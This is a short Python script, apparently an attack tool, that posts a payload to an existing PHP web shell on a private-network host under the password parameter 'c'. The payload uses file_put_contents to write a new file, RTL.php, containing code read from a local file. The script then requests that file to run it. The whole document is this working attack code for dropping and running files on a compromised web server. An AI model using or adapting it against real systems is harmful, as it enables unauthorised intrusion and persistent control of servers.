# -*- coding:utf8 -*-
# Author: RTL
# Date: 2019.02.20

v_ip = "http://192.168.142.129/"
p = "c"

import requests

def UploadFile(url, passwd):
  file = open('codepython.txt')
  code = file.read()
  file_content = 'file_put_contents("RTL.php", "%s");' % code
  j = {
    passwd : file_content
  }
  res = requests.post(url, data=j)

def TouchFile(url):
  try:
    res = requests.get(url, timeout=2)
    print res.text
  except:
    print v_ip, "Success!"

if __name__ == "__main__":
  UploadFile(v_ip, p)
  TouchFile(v_ip + "RTL.php")